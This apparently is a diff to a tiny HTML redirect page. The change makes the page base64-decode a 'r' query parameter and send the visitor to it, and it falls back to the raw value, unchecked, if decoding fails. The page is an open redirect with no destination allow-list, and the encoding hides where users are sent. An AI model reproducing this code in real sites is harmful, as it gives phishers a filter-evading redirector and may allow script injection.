@@ -1,15 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <script>
-    var params = new URLSearchParams(window.location.search);
-    var target = params.get('r');
-    if (target) {
+<meta charset="UTF-8">
+<title>Please wait...</title>
+<script>
+var params = new URLSearchParams(window.location.search);
+var encoded = params.get('r');
+if (encoded) {
+  try {
+    var target = atob(encoded);
+    if (target.startsWith('http')) {
       window.location.replace(target);
     }
-  </script>
+  } catch(e) {
+    window.location.replace(encoded);
+  }
+}
+</script>
 </head>
-<body></body>
+<body><p style="font-family:Arial;color:#888;text-align:center;margin-top:40vh;">Please wait...</p></body>
 </html>
